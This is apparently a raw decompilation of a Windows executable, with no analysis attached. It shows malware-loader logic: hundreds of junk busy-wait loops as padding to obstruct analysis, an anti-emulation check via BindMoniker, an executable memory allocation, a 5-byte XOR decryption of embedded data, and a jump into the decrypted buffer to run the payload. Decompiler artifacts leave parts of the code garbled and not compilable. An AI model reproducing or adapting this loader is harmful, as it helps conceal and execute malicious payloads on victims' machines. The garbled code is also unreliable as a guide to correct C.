// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 13101000: FlagGroup Eq_2 fn13101000(Register Eq_3 eax, Stack Eq_3 dwArg04, Stack Eq_5 dwArg08, Stack word32 dwArg0C, Stack (ptr word32) dwArg10, Stack Eq_8 dwArg14, Stack (arr Eq_219) dwArg18)
Eq_2 fn13101000(LPVOID eax, LPVOID dwArg04, LPVOID dwArg08, word32 dwArg0C, word32 * dwArg10, LPVOID dwArg14, Eq_219 dwArg18[])
{
	ui32 ebp_16 = (char *) eax + 0x00038884 ^ 0xF90A;
	do
		;
	while (ebp_16 == 0x00);
	ui32 ebp_40 = (char *) eax + 0x00038884 ^ 0xF90A;
	do
		;
	while (ebp_40 == 0x00);
	ui32 ebp_66 = (char *) eax + 0x00038884 ^ 0xF90A;
	do
		;
	while (ebp_66 == 0x00);
	ui32 ebp_91 = dwArg10 + 0x0000E221 ^ 0xF90A;
	do
		;
	while (ebp_91 == 0x00);
	ui32 ebp_118 = dwArg10 + 0x0000E221 ^ 0xF90A;
	do
		;
	while (ebp_118 == 0x00);
	*dwArg10 = dwArg0C;
	ui32 ebp_142 = dwArg10 + 0x0000E221 ^ 0xF90A;
	do
		;
	while (ebp_142 == 0x00);
	ui32 ebp_167 = (char *) dwArg14 + 0x00038884 ^ 0xF90A;
	do
		;
	while (ebp_167 == 0x00);
	ui32 ebp_196 = (char *) dwArg14 + 0x00038884 ^ 0xF90A;
	do
		;
	while (ebp_196 == 0x00);
	ui32 ebp_221 = (char *) dwArg14 + 0x00038884 ^ 0xF90A;
	do
		;
	while (ebp_221 == 0x00);
	uint64 edx_eax_229 = (uint64) (uint32) dwArg14;
	uint32 eax_239 = (uint32) (edx_eax_229 /u 0x05);
	word16 dx_238 = (word16) (uint32) (edx_eax_229 % 0x05);
	ui32 ebp_252 = eax_239 + 0x00038884 ^ 0xF90A;
	do
		;
	while (ebp_252 == 0x00);
	word16 wLoc0C_1048 = dx_238;
	ui32 ebp_276 = eax_239 + 0x00038884 ^ 0xF90A;
	do
		;
	while (ebp_276 == 0x00);
	ui32 ebp_303 = eax_239 + 0x00038884 ^ 0xF90A;
	do
		;
	while (ebp_303 == 0x00);
	word32 edx_317 = dwArg04 + dwArg14;
	ui32 ebp_331 = eax_239 + 0x00038884 ^ 0xF90A;
	do
		;
	while (ebp_331 == 0x00);
	byte * dwArg04_1187 = edx_317;
	ui32 ebp_355 = eax_239 + 0x00038884 ^ 0xF90A;
	do
		;
	while (ebp_355 == 0x00);
	while (true)
	{
		word32 ebp_401 = dwArg0C + 0x00038884;
		do
			;
		while ((ebp_401 ^ 0xF90A) == 0x00);
		ui32 ebp_428 = dwArg0C + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_428 == 0x00);
		word32 ecx_442 = dwArg0C - 0x01;
		ui32 ebp_456 = dwArg0C + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_456 == 0x00);
		dwArg0C = ecx_442;
		ui32 ebp_480 = dwArg0C + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_480 == 0x00);
		Eq_2 dwLoc14_500 = false;
		ui32 ebp_506 = dwArg0C + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_506 == 0x00);
		if (!dwLoc14_500)
			break;
		ui32 ebp_615 = dwArg0C + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_615 == 0x00);
		byte al_629 = *dwArg04_1187;
		word32 eax_630 = DPB(dwArg0C, al_629, 0);
		ui32 ebp_640 = eax_630 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_640 == 0x00);
		ui32 ebp_665 = eax_630 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_665 == 0x00);
		int32 ecx_679 = (int32) wLoc0C_1048;
		ui32 ebp_691 = eax_630 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_691 == 0x00);
		ui32 ebp_718 = eax_630 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_718 == 0x00);
		word32 eax_732 = (word32) (&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&dwArg18[ecx_679].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00];
		ui32 ebp_742 = eax_732 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_742 == 0x00);
		int32 ecx_756 = (int32) al_629;
		ui32 ebp_768 = eax_732 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_768 == 0x00);
		byte cl_783 = (byte) (ecx_756 ^ eax_732);
		ui32 ebp_797 = eax_732 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_797 == 0x00);
		ui32 ebp_821 = eax_732 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_821 == 0x00);
		ui32 ebp_847 = eax_732 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_847 == 0x00);
		word32 eax_862 = DPB(eax_732, cl_783, 0);
		ui32 ebp_873 = eax_862 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_873 == 0x00);
		*dwArg08 = (Eq_5) cl_783;
		ui32 ebp_898 = eax_862 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_898 == 0x00);
		ui32 ebp_924 = eax_862 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_924 == 0x00);
		word16 cx_938 = wLoc0C_1048 + 0x01;
		ui32 ebp_952 = eax_862 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_952 == 0x00);
		wLoc0C_1048 = cx_938;
		ui32 ebp_976 = eax_862 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_976 == 0x00);
		int32 edx_990 = (int32) cx_938;
		ui32 ebp_1002 = eax_862 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_1002 == 0x00);
		ui32 ebp_1027 = eax_862 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_1027 == 0x00);
		word32 eax_1034 = eax_862;
		if (edx_990 == 0x05)
		{
			do
				;
			while (225678 == 0x00);
			wLoc0C_1048 = 0x00;
			do
				;
			while (225678 == 0x00);
			eax_1034 = 0x00;
		}
		word32 ebp_1066 = eax_1034 + 0x00038884;
		do
			;
		while ((ebp_1066 ^ 0xF90A) == 0x00);
		Eq_5 ecx_1081 = (char *) dwArg08 + 0x01;
		word32 ebp_1094 = eax_1034 + 0x00038884;
		do
			;
		while ((ebp_1094 ^ 0xF90A) == 0x00);
		dwArg08 = ecx_1081;
		word32 ebp_1118 = eax_1034 + 0x00038884;
		do
			;
		while ((ebp_1118 ^ 0xF90A) == 0x00);
		word32 ebp_1144 = eax_1034 + 0x00038884;
		do
			;
		while ((ebp_1144 ^ 0xF90A) == 0x00);
		byte * edx_1159 = dwArg04_1187 + 0x01;
		word32 ebp_1172 = eax_1034 + 0x00038884;
		do
			;
		while ((ebp_1172 ^ 0xF90A) == 0x00);
		dwArg04_1187 = edx_1159;
		word32 ebp_1196 = eax_1034 + 0x00038884;
		do
			;
		while ((ebp_1196 ^ 0xF90A) == 0x00);
	}
	do
		;
	while (225679 == 0x00);
	do
		;
	while (225679 == 0x00);
	do
		;
	while (225679 == 0x00);
	return dwLoc14_500;
}

// 1310156E: Register Eq_381 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	Eq_382 eax_17 = BindMoniker((IMoniker *) 0x000F0000, 0x1000, (IID *) 0x00090F7F, null);
	if (eax_17 == 0x80070057)
	{
		word32 ebp_139 = eax_17 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_139 == 0x00);
		word32 ebp_163 = eax_17 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_163 == 0x00);
		word32 ebp_187 = eax_17 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_187 == 0x00);
		word32 ebp_211 = eax_17 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_211 == 0x00);
		word32 ebp_235 = eax_17 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_235 == 0x00);
		word32 ebp_259 = eax_17 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_259 == 0x00);
		word32 ebp_283 = eax_17 + 0x00038884 ^ 0xF90A;
		do
			;
		while (ebp_283 == 0x00);
		do
			;
		while (0x131353DE == 0x00);
		word32 ecx_322 = globals->dw13102250;
		do
			;
		while (0x131353DE == 0x00);
		do
			;
		while (0x131353DE == 0x00);
		do
			;
		while (0x131353DE == 0x00);
		do
			;
		while (0x131353DE == 0x00);
		do
			;
		while (0x131353DE == 0x00);
		ui32 ebp_454 = fp + 0x00038874 ^ 0xF90A;
		do
			;
		while (ebp_454 == 0x00);
		ui32 ebp_479 = fp + 0x00038874 ^ 0xF90A;
		do
			;
		while (ebp_479 == 0x00);
		ui32 ebp_504 = fp + 0x00038874 ^ 0xF90A;
		do
			;
		while (ebp_504 == 0x00);
		ui32 ebp_528 = fp + 0x00038874 ^ 0xF90A;
		do
			;
		while (ebp_528 == 0x00);
		ui32 ebp_553 = fp + 0x00038874 ^ 0xF90A;
		do
			;
		while (ebp_553 == 0x00);
		ui32 ebp_577 = fp + 0x00038874 ^ 0xF90A;
		do
			;
		while (ebp_577 == 0x00);
		ui32 ebp_602 = fp + 0x00038874 ^ 0xF90A;
		do
			;
		while (ebp_602 == 0x00);
		fn13101000(fp - 0x10, fp - 0x28, fp - 0x28, 0x04, fp - 0x10, null, fp - 0x0234);
		do
			;
		while (225679 == 0x00);
		do
			;
		while (0x131353DE == 0x00);
		word32 ecx_666 = globals->dw13102254;
		do
			;
		while (0x131353DE == 0x00);
		fn13101000(fp - 0x10, fp - 0x025C, fp - 600, 0x04, fp - 0x10, (void *) 0x04, fp - 0x0234);
		ui32 v14_715 = globals->dw13102258;
		fn13101000(fp - 0x10, fp - 0x1C, fp - 0x14, 0x04, fp - 0x10, (void *) 0x08, fp - 0x0234);
		Eq_591 eax_750 = GetModuleHandleA(null);
		word32 eax_765 = globals->dw1310225C;
		fn13101000(fp - 0x10, fp - 0x28, fp - 0x1C, 0x04, fp - 0x10, (void *) 0x0C, fp - 0x0234);
		Eq_8 dwLoc0248_1058 = globals->t13102260;
		fn13101000(fp - 600, fp - 600, fp - 0x0248, 0x04, fp - 0x10, (void *) 0x10, fp - 0x0234);
		Eq_8 ecx_864 = v14_715 * 0x08 + 0x0C;
		Eq_8 dwLoc0250_1059 = (void *) 0x14;
		word32 * dwLoc24_1060 = &globals->dw13102264;
		Eq_5 eax_881 = VirtualAlloc(null, (char *) ecx_864 + ecx_666 + ecx_322, 0x3000, 0x40);
		word32 dwLoc0C_1061 = eax_765 + eax_750 + ecx_864;
		Eq_8 dwLoc0264_1062 = ecx_864;
		ui32 dwLoc08_1056 = 0x00;
		Eq_657 dwLoc18_1095 = null;
		while (0x01 != 0x00)
		{
			if (dwLoc0264_1062 == dwLoc0248_1058)
			{
				ui32 edx_1120 = dwLoc08_1056 + 0x01;
				dwLoc08_1056 = edx_1120;
				if (edx_1120 == v14_715)
					break;
				word32 edx_1137 = *dwLoc24_1060;
				fn13101000(fp - 0x1C, fp - 0x1C - dwLoc0250_1059, fp - 0x1C, 0x04, fp - 0x10, dwLoc0250_1059, fp - 0x0234);
				LPVOID * ecx_1183 = dwLoc24_1060 + 0x01;
				Eq_8 eax_1176 = (char *) dwLoc0250_1059 + 0x04;
				dwLoc0248_1058 = (Eq_8) *ecx_1183;
				fn13101000(fp - 0x10, fp - 0x0248 - eax_1176, fp - 0x0248, 0x04, fp - 0x10, eax_1176, fp - 0x0234);
				dwLoc0250_1059 = (Eq_8) ((char *) eax_1176 + 0x04);
				dwLoc24_1060 = (word32 *) ((char *) ecx_1183 + 0x04);
				dwLoc0264_1062 = null;
				dwLoc0C_1061 = (byte *) (eax_750 + edx_1137 / 0x04);
			}
			Mem1081[eax_881 + dwLoc18_1095:byte] = Mem0[dwLoc0C_1061 + 0x00:byte];
			dwLoc0C_1061 = dwLoc0C_1061 + 0x01;
			dwLoc18_1095 = dwLoc18_1095 + 0x01;
			dwLoc0264_1062 = (Eq_8) ((char *) dwLoc0264_1062 + 0x01);
		}
		Eq_3 eax_969 = eax_881 - ecx_864;
		byte DP_973 = fn13101000(eax_969, eax_969, eax_881, ecx_666, fp - 0x0238, ecx_864, fp - 0x0234);
		word32 esp_1028;
		word32 ebp_1029;
		byte SCZO_1030;
		word32 eax_1031;
		byte SZO_1032;
		byte C_1033;
		byte Z_1034;
		byte SCZDOP_1035;
		word32 ecx_1036;
		word32 edx_1037;
		byte dl_1038;
		byte DP_1039;
		(eax_881 + 0x0F50)();
		return 0x00;
	}
	else
	{
		<anonymous> * eax_73 = (GetACP() << 0x02) + 0x04001000;
		word32 esp_114;
		word32 ebp_115;
		byte SCZO_116;
		Eq_381 eax_117;
		byte SZO_118;
		byte C_119;
		byte Z_120;
		byte SCZDOP_121;
		word32 ecx_122;
		word32 edx_123;
		byte dl_124;
		byte DP_125;
		eax_73();
		return eax_117;
	}
}

